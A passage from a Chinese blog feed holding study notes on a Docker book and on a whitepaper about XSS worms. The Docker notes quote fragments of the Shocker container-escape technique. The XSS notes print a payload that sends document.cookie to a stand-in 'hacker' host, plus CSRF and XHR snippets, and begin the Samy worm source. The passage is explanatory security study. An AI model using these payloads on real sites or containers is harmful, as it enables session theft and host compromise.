之间的隔离，（ps从procfs里读取），实际上的操作是隔离的，如kill</td></tr><tr><td>Mount</td><td>挂载点隔离</td></tr><tr><td>Network</td><td>网络接口隔离</td></tr><tr><td>User</td><td>用户以及用户权限隔离</td></tr></tbody></table><h2 id="Docker-的镜像"><a href="#Docker-的镜像" class="headerlink" title="Docker 的镜像"></a>Docker 的镜像</h2><p>image是启动容器的只读模板，是容器启动需要的rootfs。下面是一些 词汇：</p><table><thead><tr><th>word</th><th>meaning</th></tr></thead><tbody><tr><td>doker hub</td><td>可以理解为一个镜像站</td></tr><tr><td>Namespace</td><td>类似 Github 中的命名空间，代表一个种类，用户或组织</td></tr><tr><td>Repository</td><td>一个 Git 仓库，可以有多个镜像</td></tr><tr><td>Tag</td><td>类似Git 的tag，区别于不同的版本</td></tr><tr><td>Layer</td><td>类似于Git的 <strong>commit</strong> ，一个长的 Hash 串</td></tr><tr><td>Image ID</td><td>镜像的唯一标识，可以等同 repo:tag</td></tr></tbody></table><p>后面的部分简述了，<strong>build，ship and run </strong> 的操作。</p><hr><p>Docker 的image的组织结构，颗粒理解为积木堆叠的形式。书中对其源文件做了探索：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull busybox# 拉取镜像</span><br><span class="line">docker history busybox# 查看镜像的历史版本</span><br><span class="line">docker inspect busybox:latest</span><br></pre></td></tr></table></figure><hr><h3 id="Docker-image-的技术亮点"><a href="#Docker-image-的技术亮点" class="headerlink" title="Docker image 的技术亮点"></a>Docker image 的技术亮点</h3><ul><li><p>联合挂载</p><p>可以把多个目录同时挂载到同一个目录。</p></li><li><p>写时复制</p><p>在和系统调用的 <code>fork</code>类似，在创建子进程的时候，并不进行新的一个内存区的复制，而是在修改了共享的内的时候触发了一次缺页的中断，这时候进行一次页分配。这时候才会有真正的写。</p></li></ul><h2 id="仓库进阶"><a href="#仓库进阶" class="headerlink" title="仓库进阶"></a>仓库进阶</h2><p>git 的思想， 可以很容易的进行 <code>pull/push</code></p><h2 id="容器间的网络"><a href="#容器间的网络" class="headerlink" title="容器间的网络"></a>容器间的网络</h2><p>这里是在实践过程中比较重要的一部分。过程较为复杂，这里记录一些 kword <code>Weave</code>，<code>Flannel</code>，这些是现有的Docker 的网络解决方案</p><ul><li>Weave</li><li>Flannel</li><li>SocketPlane</li></ul><h2 id="容器卷管理"><a href="#容器卷管理" class="headerlink" title="容器卷管理"></a>容器卷管理</h2><p>在执行 <code>run/create</code> 使用 <code>-v</code> 来添加数据卷 volume，当然也可以将主机上的卷挂载到 容器中来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -v /var/vol --name mytest busybox# 添加新的卷</span><br><span class="line">docker run -d -v /var/vol:/home/test --name mytest busybox# 挂载主机卷</span><br></pre></td></tr></table></figure><p>可以创建一个共有的存储容器，在其他的实例上使用 <code>--vloume-from</code> 来共享卷</p><hr><p>问题：数据卷的悬挂问题</p><p>在删除容器的时候，需要显式的指明所挂载的卷，分配卷的空间才会被删除，如果不指定，就会出现数据卷的悬挂（dangling），浪费大量空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm mytest</span><br><span class="line">docker rm mytest -v /var/vol</span><br></pre></td></tr></table></figure><h2 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker API"></a>Docker API</h2><p>Docker 的API 设计 满足 <strong>RESTful(Representational State Transfer)</strong> 表达性状态转移。其API 设计：清晰，简单，低耦合，无状态，面向资源。</p><p>Docker 提供了API接口，使得其拓展性得到极大的提高。有提供三类API：</p><ul><li>Docker Remote API    比如 docker run 这种服务控制的命令</li><li>Docker Registry API    可以用来控制镜像存储</li><li>Docker Hub API        与Docker 的关系不大</li></ul><hr><p>示例请求，Docker 在启动的时候，会默认开启API，并且监听本地的unix 套接字，默认值为 <code>unix:///var/run/docker.sock</code>，可以直接向套接字写内容从而实现了API的调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里直接向套接字写了HTTP的请求，server 会直接返回了当前的所有的镜像的状态。</p><hr><p>当然，Docker 也会监听 <code>localhost:5678</code> 作为API 的请求端口，（之前有用过一个 GUI 的Docker的管理工具，其核心就是通过API与服务进行交互）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET localhost:5678/image/debian/history| python -m json.tool# 等同：</span><br><span class="line">docker history debian</span><br></pre></td></tr></table></figure><hr><p>Docker API 的监听在其启动的时候进行配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d -H unix:///var/run/docker.sock -H tcp://localhost:32768</span><br></pre></td></tr></table></figure><hr><h3 id="API的应用场景"><a href="#API的应用场景" class="headerlink" title="API的应用场景"></a>API的应用场景</h3><p>书中在这里以神奇的背景展开了一个使用案例：</p><ul><li>一个python 写的httpserver</li><li>打包成一个 Docker 镜像<ul><li>Dockerfile 和其依赖的文件打压缩包</li><li>使用远程的Docker 主机对镜像进行构建】</li></ul></li><li>发布镜像到Registry pash</li><li>其他主机 Pull 到本地</li><li>本地运行容器实例并验证</li><li>至此完成一个docker 的helloworld。</li></ul><p>这里对这个场景进行简单的描述，后面将会有操作的实例。</p><h2 id="Docker-的安全"><a href="#Docker-的安全" class="headerlink" title="Docker 的安全"></a>Docker 的安全</h2><p>由于 Docker 和物理主机是公用同一个内核，因此受攻击的面将会特别的广，<strong>而且一旦容器内的程序导致了内核的panic，物理机的内核也将 Painc</strong></p><p>共用内核使用Cgroup和Namespace 实现了容器隔离和资源限制的目的。Namespace 目前不是十分完善。<strong>所以导致了虚拟容器中的逃逸问题</strong>，（比如 PS 使用的 procfs ，就可以看到物理机的所有的 ps）这个是特性导致，所以很难完美的处理。现在应用的安全策略：</p><ol><li>Cgroup    进行资源限制</li><li>ulimit    资源限制</li><li>容器组网    安全</li><li>容器+全虚拟化    公有云，安全需求很高的解决方案</li><li>监控    <code>docker ps -a</code> 监控容器状态</li><li>文件级防护    对文件的权限进行严格的控制</li><li>capability</li><li>SELinux    严格的DAC ，资助访问控制</li><li>AppArmor</li><li>Seccomp</li><li>grsecurity    内核的 patch 大大提高安全性</li></ol><h3 id="安全示例"><a href="#安全示例" class="headerlink" title="安全示例"></a>安全示例</h3><h4 id="主机逃逸"><a href="#主机逃逸" class="headerlink" title="主机逃逸"></a>主机逃逸</h4><p><strong>shocker攻击</strong> 通过 <code>open_by_handle_at</code> 和 <code>name_to_handle_at</code> 这两个系统调用实现。先在容器内打开一个文件描述符，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/.dockerinit"</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p>之后使用 <code>open_by_handle_at</code> 获取文件的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY);</span><br><span class="line">dir = fdopendir(fd)</span><br></pre></td></tr></table></figure><p>并且在这里得到其打开的所有目录？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de = readdir(dir);</span><br></pre></td></tr></table></figure><p>得到其目录的结构体，之后进行对比与 <code>/etc/shadow</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(de-&gt;d_name, path, <span class="built_in">strlen</span>(de-&gt;d_name));</span><br></pre></td></tr></table></figure><p>找到了包含 shadow 的de目录之后，开始穷举句柄：</p><hr><p>后面略过部分的内容。讲解了Libcontainer 的一些技术原理。</p><h2 id="Docker-实践篇"><a href="#Docker-实践篇" class="headerlink" title="Docker 实践篇"></a>Docker 实践篇</h2><h3 id="Dockerfile-的hello-world"><a href="#Dockerfile-的hello-world" class="headerlink" title="Dockerfile 的hello world"></a>Dockerfile 的hello world</h3><p>Dockerfile 用来制作镜像，像是一个蓝图一样，</p><ul><li>以 # 为注释</li><li>每一行一个命令</li><li>四部分组成<ul><li>基础镜像信息</li><li>维护者信息</li><li>镜像操作指令</li><li>容器启动指令</li></ul></li></ul><p>书中给了一个 Nginx 的基础镜像的配置，这里进行cpoy：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">MAINTAINER</span> admin xxx</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"[软件源]"</span> &gt;&gt; /etc/apt/source.list<span class="comment"># 添加软件源</span></span></span><br><span class="line"><span class="bash">RUN apt-get update &amp;&amp; apt-get install -y nginx </span></span><br><span class="line"><span class="bash">RUN <span class="built_in">echo</span> <span class="string">"\ndeamon off"</span> &gt;&gt; /etc/nginx/nginx.conf<span class="comment"># 写配置前台运行</span></span></span><br><span class="line"><span class="bash">CMD /usr/sbin/nginx<span class="comment"># 启动服务</span></span></span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>KeyWord</th><th>DESC</th></tr></thead><tbody><tr><td>FROM <image></image></td><td>继承自哪个镜像</td></tr><tr><td>MAINTAINER <name></name></td><td>指定维护者信息</td></tr><tr><td>RUN <command></td><td>执行SHELL指令，类似 <code>sh -c</code></td></tr><tr><td>EXPOSE</td><td>暴露容器端口</td></tr><tr><td>CMD</td><td>启动容器时执行的命令，<strong>只能有一条</strong></td></tr><tr><td>VOLUME</td><td>创建挂载点</td></tr><tr><td>ENV <key> <value></value></key></td><td>定义环境变量</td></tr><tr><td>ADD <src> <dest></dest></src></td><td>复制指定src(URL，tar，相对路径)的指定文件到目的卷</td></tr><tr><td>COPY \<src> \<dset></dset></src></td><td>复制本地主机的文件到容器的目</td></tr></tbody></table><hr><h3 id="Docker-镜像-的制作与启动"><a href="#Docker-镜像-的制作与启动" class="headerlink" title="Docker 镜像 的制作与启动"></a>Docker 镜像 的制作与启动</h3><p>书中给出了一个DockerFile 的示例：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> busybox</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> date;sleep 100;date</span></span><br><span class="line"><span class="bash">RUN <span class="built_in">echo</span> <span class="string">"abc"</span> &gt; /mytest</span></span><br><span class="line"><span class="bash">RUN date;sleep 100; date</span></span><br><span class="line"><span class="bash">CMD /bin/bash</span></span><br></pre></td></tr></table></figure><p>RUN 命令都是在容器内部执行的，最后的CMD为最后返回的内容。</p><p>在书中是以一个 Tomcat 的例子来演示的。这里主要设计到了镜像的拉去，以及 卷的 静态挂载，SSL 证书的生成。之后贼了容器内部，把 证书保存在 指定的目录，并且修改一下 server 的配置。</p><p>完成所有的配置之后，直接进行一次 commit。之后 跑容器实例即可。</p><p><strong>源码导入</strong> 使用静态导入以及动态导入两种方式。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomecat:https</span><br><span class="line"><span class="keyword">MAINTAINER</span> xxx</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./websrc /usr/<span class="built_in">local</span>/tomecat/webapps/myproj</span></span><br></pre></td></tr></table></figure><p><strong>动态挂载</strong> 把本地的数据卷挂载在容器中，现在船舰一个挂载点，把文件动态挂载到容器中。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomcat:http</span><br><span class="line"><span class="keyword">MAINTAINER</span> xxx </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /usr/<span class="built_in">local</span>/tomcat/webapps/myproj</span></span><br><span class="line"><span class="bash">VOLUME /usr/<span class="built_in">local</span>/tomcat/webapps/myproj</span></span><br></pre></td></tr></table></figure><p>在启动容器的时候指定参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti -v $(pwd)/websrc:/usr/local/tomcat/webapps/myproj</span><br></pre></td></tr></table></figure><hr><h3 id="Docker-的架构"><a href="#Docker-的架构" class="headerlink" title="Docker 的架构"></a>Docker 的架构</h3><p>微服务之核心就在于此,把服务的多个部分以容器的形式，分散在各处。比如实现一个 web服务架构，除了上面的web服务器之外，还有后端的数据库，或者是 一些其他的模块。</p><p><strong>Docker-compose</strong>  提供了一个Docker 的工程的管理，可以实现对多个容器的构成一个项目的整合。</p><h2 id="Docker-的集群管理"><a href="#Docker-的集群管理" class="headerlink" title="Docker 的集群管理"></a>Docker 的集群管理</h2><p>在生产环境的使用的时候，当然是需要进行统一管理的。这里在书中就引入了几个工具：</p><h3 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h3><blockquote><p>一个应用往往有多个组件构成，Docker 的最佳实践是一个容器运行一个进程</p></blockquote><p>所以为了实现容器之间的同意管理，以及协作工作，这里就有了 Compose 。</p><h3 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h3><p>简化Docker 安装的工具</p><h3 id="Swarm"><a href="#Swarm" class="headerlink" title="Swarm"></a>Swarm</h3><p>集群管理工具，实现把多个Docker主机组成的系统，整合为统一的虚拟Docker 主机。</p><blockquote><p>swap,plug and play</p></blockquote><hr><p><strong>K8S</strong></p><h2 id="FAQ（Frequently-asked-questions-）"><a href="#FAQ（Frequently-asked-questions-）" class="headerlink" title="FAQ（Frequently asked questions ）"></a>FAQ（<em>Frequently asked questions</em> ）</h2><p>书后面的 FAQ，这里挑选部分摘录：</p><ul><li>Docker 容器中管理多个进程<ul><li>使用 <code>supervisord,runit</code>等进行进程的统一管理，保持管理进程工作即可</li></ul></li><li>ATTACH 到容器之后怎么退出<ul><li>操作和 <code>screen</code> 有些类似使用 <code>ctrl+P，ctrl+Q</code> 进行退出，容器继续进行，如果使用 <code>ctrl+c</code> 可能导致进程结束从而容器退出</li></ul></li></ul><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>通过这本书，对Docker 的认识，和使用更上了一个台阶，后面准备实现一个 基于Docker 的在线编译执行的东西。</p><p>基础构想是 使用 Nginx 跑 Python的CGI，post 源码，之后编译执行，再返回前端，把这个打包成镜像</p><p>下一步就是把服务拆开，单容器单进程，把 nginx 和 uwsgi 拆分开来，使用多容器合作。</p><p>后面看看 Docker 的源码吧。</p><p>书后推荐书籍：    </p><ul><li>Docker 技术入门与实践    9787111488521</li><li>Docker 源码分析            9787111510727</li><li>Linux 内核设计与实现        </li><li>Linux 内核精髓</li></ul>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/12/31/Book_Docker%E8%BF%9B%E9%98%B6%E4%B8%8E%E5%AE%9E%E8%B7%B5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《XSS 蠕虫 &amp; 病毒》</title>
      <link>https://www.diglp.xyz/2018/12/24/Book_XSS_worm&amp;virus/</link>
      <guid>https://www.diglp.xyz/2018/12/24/Book_XSS_worm&amp;virus/</guid>
      <pubDate>Sun, 23 Dec 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>突然一个状态的转变,总是需要好解的转变的时间。</p><p>事前比较多，感觉自己在知识的荒野上已经漫步了好久。时而有着恐慌的感觉。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：XSS 蠕虫 &amp; 病毒</li><li>副标题：即将发生的威胁与最好的防御</li><li>作者：June 2007 – updated Jeremiah Grossman</li><li>翻译：<span class="exturl" data-url="aHR0cDovL2hpLmJhaWR1LmNvbS9mb295aW5n" title="http://hi.baidu.com/fooying">Fooying<i class="fa fa-external-link"></i></span>（知道创宇安全研究团队）</li><li>来源：<span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8veHNzLXdvcm1zLWFuZC12aXJ1c2VzL2NvbnRlbnQvMC5odG1s" title="https://wizardforcel.gitbooks.io/xss-worms-and-viruses/content/0.html">GitBook<i class="fa fa-external-link"></i></span></li></ul><p>一本篇幅短小的书，主要是将关于 XSS蠕虫 的书籍， 这个蠕虫其实都不陌生，一年前，记得qq空间里面的自动转发，这个就是和书里的主角有关系了。</p><p>简单来说，XSS 在用户的浏览器端注入了目标代码，用于伪造了用户的操作，然而使用 XSS 的蠕虫，可以在用户的repost 的内容里面再次插入恶意JS 实现了自我的复制以及传播。</p><p>这篇文章， 作为对这个技术的了解以及认识吧。</p><blockquote><p>在本白皮书中，我们将提供一个关于 XSS 的概述;定义 XSS 蠕虫;检验传播方式，感染率和潜在的影响。最重要的是，我们将描述如何立即采取措施，企业可以采取以捍卫他们的网站。</p></blockquote><h2 id="XSS蠕虫的知识点"><a href="#XSS蠕虫的知识点" class="headerlink" title="XSS蠕虫的知识点"></a>XSS蠕虫的知识点</h2><p>这里用自己的观点总结一下：</p><ol><li><p>来自于可以有用户输入的地方</p></li><li><p>XSS 依附于web 比桌面的 应用程序的 worm 更加快速广泛</p></li><li><blockquote><p>与操作系统（Windows，Linux 和 Macintosh OS X 等等）无关，因为是在 Web 浏览器发生并执行的。</p></blockquote></li><li><blockquote><p>能够避免网络堵塞,因为通过 Web 服务器到 Web 浏览器（客户端 - 服务器）模式传播，而不是一个典型的盲目的 对等模型。</p></blockquote></li><li><p>XSS蠕虫 依附于 web 的服务本身。</p></li><li><blockquote><p>比传统互联网病毒更容易停下来，因为拒绝感染网站的访问可以被隔离以阻止传播。</p></blockquote><p>因为XSS 的漏洞是存在于 web 页面之上，出现了可能存储XSS的注入js 的地方，但是一旦进行过滤，或者，对其行为进行阻止，其传播途径便受阻了。</p></li></ol><h2 id="XSS知识点"><a href="#XSS知识点" class="headerlink" title="XSS知识点"></a>XSS知识点</h2><p>非持久型XSS，也成为反射性的XSS。用户输入在一个动作后会出现在用户页面上，二实际上并不会进行存储。</p><p>所以可以理解为，是用户构建的一次性的反射XSS , 一般出现在 <strong>get型的搜索页面</strong>  中。因为用户提交的搜索内容，会再次的出现在了页面之中。座椅这样被可以出发了，XSS。</p><p>当然，反射型的 XSS 在进行构造之后通过用户点击进行触法，多半用于phishing 的过程之中。</p><p>eg:在存在反射型的XSS 的时候可以构造如下链接形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://victim/search.pl?search=test+search+[payload]</span><br><span class="line">”&gt;&lt;SCRIPT&gt;alert(‘XSS%20Testing’)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>这样我们的 payload 就出现在了搜索结果的页面中去，所以就可以被触发。</p><p>一般用于钓鱼链接，当然一旦有了入口就可以实现更加复杂的功能了。</p><p>使用如下的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;SCRIPT&gt;var+img=new+Image();img.src=&quot;http://hacker/”%20+%20document.cookie;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>这样就构造了一个DOM的对象，就向目标网站提交了用户的 cookies。（当然也可使用 ajax 进行高级操作）。</p><hr><p>非持久型XSS，这一类的XSS 就是危害比较大的类型，多存在于留言板之类用于存储并且显示用户输入的地方。用户输入的内容没有经过严格的检测，导致直接在页面上被加载以及解析，导致访问该页面的用户都受到影响。</p><p>危害性往往的是高于非持久性的。具体的利用细节，实际上也是对过滤进行 bypass ， 之后注入js 等待用户的触发。</p><h2 id="XSS-的传播方法"><a href="#XSS-的传播方法" class="headerlink" title="XSS 的传播方法"></a>XSS 的传播方法</h2><blockquote><p>XSS 蠕虫病毒可能会使 得浏览器进行发送电子邮件，转账，删除/修改数据，入侵其他网站，下载非法内容，以及许多其他形式的恶意活动。 用最简单的方式去理解，就是如果没有适当的防御，在网站上的任何功能都可以在未经用户许可的情况下运行。</p></blockquote><hr><p>XSS 的漏洞被利用在传播的时候，通常是 <code>HTML/Javascript</code>的代码。使用 </p><ul><li>嵌入的HTML标签</li><li>JavaScript DOM的对象</li><li>XMLHTTPRequest（XHR）</li></ul><hr><h3 id="嵌入的HTML标签"><a href="#嵌入的HTML标签" class="headerlink" title="嵌入的HTML标签"></a>嵌入的HTML标签</h3><p>一些html的标签，可以在加载的时候去请求非同源的资源。比如，img 的图像标签便可以实现这样的一个功能。</p><p>使用 img 的src属性可以在加载页面的时候，对远程的主机进行请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">”http://www.google.com/search?hl</span>=<span class="string">en&amp;q</span>=<span class="string">whitehat+security&amp;btnG</span>=<span class="string">Google+Search”</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的请求里面，知识进行了一次对 google 的请求，当然，这里的地址便可以模拟一次用户的请求，比如：增加删除好友。这是一个 get 的请求，当然也可以通过get 的方式向，目标主机传递当前的数据。</p><hr><h3 id="JavaScript-和-DOM"><a href="#JavaScript-和-DOM" class="headerlink" title="JavaScript 和 DOM"></a>JavaScript 和 DOM</h3><p><code>DOM = document object model</code>  这里一样可以使用DOM对象，实现一个对非同源站点的请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://www.google.com/search?hl=en&amp;q=whitehat+security&amp;btnG=Google+Search"</span></span><br></pre></td></tr></table></figure><p>通过改变图像的src属实现去其他的请求。</p><h3 id="XmlHttpRequest-XHR"><a href="#XmlHttpRequest-XHR" class="headerlink" title="XmlHttpRequest (XHR)"></a>XmlHttpRequest (XHR)</h3><p><code>AJAX (异步 JavaScript 和 XML)</code> JQuery中包含 ajax 的功能，一样实现对远程主机提交数据。</p><p>第一个XSS蠕虫在 2005年10月4日，</p><blockquote><p>使用一些绕过技 术，Samy 成功上传了他的代码。当一个通过身份验证 MySpace 的用户观看 Samy 的个人资料，该蠕虫病毒的 payload 使用 XHR，使得用户的网页浏览器发送请求，增加 Samy 为朋友，包括加 Samy 为他英雄（译者注：类似微博关注）（“但最重要的是，加 Samy 为英雄这点”，如图 6），并用恶意代码的副本改变用户的个人资料。当用户访问 Samy 或 者其他受感染用户的个人资料页，他们基本上在打开浏览器时就受到攻击。</p></blockquote><p>这里的vector 是关注了目标用户，payload 是在用户的个人信息上插入了XSS的代码。</p><h2 id="XSS-蠕虫和常规的桌面蠕虫"><a href="#XSS-蠕虫和常规的桌面蠕虫" class="headerlink" title="XSS 蠕虫和常规的桌面蠕虫"></a>XSS 蠕虫和常规的桌面蠕虫</h2><table><thead><tr><th>信息</th><th>时间</th><th>数量</th><th>voctor</th></tr></thead><tbody><tr><td>Code Red I 和 Code Red II(红色代码)</td><td>2001 年 7 月 12 日</td><td>275,000</td><td>IIS Web 服务的缓冲区溢出</td></tr><tr><td>Slammer(地狱)</td><td>2003 年 1 月 25 日</td><td>55,000</td><td>Microsoft SQL Server 缓冲 区溢出漏洞</td></tr><tr><td>Blaster(冲击波)</td><td>2003 年 8 月 11 号</td><td>336,000</td><td>远程过程调用（RPC）</td></tr><tr><td>Samy</td><td></td><td>1,000,000</td></tr></tbody></table><blockquote><p>XSS 蠕虫和病毒有一个分布的中心点，Web 服务器，并且执行只发生在 Web 浏览器。接下来，攻击代码只从 Web 服务器发送到浏览器，反之亦然（见图 9），而不是从浏览器到浏览器或其他蠕虫的对等情况。这个特性减少了 网络噪声的体积。此外，每个网站访问代表一个活的计算机和可能的受害者，因为 XSS 恶意软件是不依赖于操作系 统。因此，感染的成功率要大得多。</p></blockquote><p>严格的分析 XSS 蠕虫之所以更加广泛传播的原因。其传播方式部署对等的。</p><blockquote><p>在本白皮书中开头，我们问：“拥有和控制着超过一百万可支配的 Web 浏览器和千兆带宽，可以做什么？”大规模的分布式拒绝服务攻击（DDoS）是一个简单的答案。让我们保守地说，每个浏览器有一个 128 Kb / s 的平均速 度（千比特/秒），并能产生一个 HTTP 请求，每秒的组合拨号，DSL，电缆，和 T-1 连接。其结果将是 128,000,000 Kb/ s 或 122 Gb / s 的吞吐量和每秒 1,000,000 HTTP 请求- 无疑是一个巨大的资源集合的访问。</p></blockquote><p>这样无疑会有十分巨大的受控资源。</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>在用户的层面上：</p><blockquote><ol><li><p>点击链接发送电子邮件或即时消息时一定要谨慎。可疑的过长链接，尤其是那些看起来像是包含 HTML 代码 的链接。如果有疑问，手动输入网址到您的浏览器地址栏进行访问。</p></li><li><p>对于 XSS 漏洞，没有网络浏览器有一个明显的安全优势。话虽如此，但作者喜欢 Firefox 浏览器。为了获得 额外的安全性，可以考虑安装一些浏览器插件，如 NoScript25（Firefox 扩展插件）或 Netcraft 工具栏 26。</p></li><li><p>虽然不是 100％有效，但是避开可疑网站，如那些提供黑客自动化工具，warez，或色情的网站是明智的。</p></li></ol></blockquote><p>在开发者的角度上说：</p><ul><li>在敏感操作的时候需要进行验证码请求，避免直接使用反射型的XSS进行请求</li><li>提交内容进行严格过滤</li></ul><h2 id="书中的附录"><a href="#书中的附录" class="headerlink" title="书中的附录"></a>书中的附录</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FORM</span> <span class="attr">ACTION</span>=<span class="string">”http://server/path/”</span> <span class="attr">NAME</span>=<span class="string">”myform”</span> <span class="attr">METHOD</span>=<span class="string">”POST”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”HIDDEN”</span> <span class="attr">NAME</span>=<span class="string">”Username”</span> <span class="attr">VALUE</span>=<span class="string">”Foo”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”HIDDEN”</span> <span class="attr">NAME</span>=<span class="string">”Password”</span> <span class="attr">VALUE</span>=<span class="string">”Bar”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里构建的一个表单，一样可以使用 JS 进行提交</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT language=”JavaScript”&gt; <span class="built_in">document</span>.myform.submit();</span><br><span class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><hr><p>通过 XHR 进行模拟请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.open(‘GET’, ‘http:<span class="comment">//server/path)/’, true);</span></span><br><span class="line">req.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        alert(req.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">req.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h2 id="Samy-蠕虫的源码-以及-个人的解读"><a href="#Samy-蠕虫的源码-以及-个人的解读" class="headerlink" title="Samy 蠕虫的源码 以及 个人的解读"></a>Samy 蠕虫的源码 以及 个人的解读</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 